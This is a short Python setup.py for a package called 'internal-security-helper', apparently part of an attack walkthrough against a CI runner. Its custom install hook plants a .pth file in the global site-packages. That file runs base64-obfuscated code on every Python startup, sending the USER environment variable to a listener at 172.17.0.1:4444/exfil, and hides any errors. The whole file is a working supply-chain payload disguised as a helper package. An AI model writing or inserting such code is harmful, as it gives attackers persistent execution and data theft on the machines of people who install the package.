import os, base64, site
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        install.run(self)
        try:
            # We target the global site-packages since act runs as root
            target_dir = site.getsitepackages()[0]
            pth_file = os.path.join(target_dir, "internal_init.pth")
            
            # USE THE IP FROM STEP 1 HERE (e.g., 172.17.0.1)
            # We use a simple GET request for maximum reliability
            payload = "import os, requests; requests.get('http://172.17.0.1:4444/exfil?data=' + os.environ.get('USER','none'))"
            b64_payload = base64.b64encode(payload.encode()).decode()
            
            with open(pth_file, "w") as f:
                f.write(f"import os, base64; exec(base64.b64decode('{b64_payload}'))\n")
        except:
            pass

setup(
    name="internal-security-helper",
    version="1.0.1",
    cmdclass={'install': CustomInstall},
)
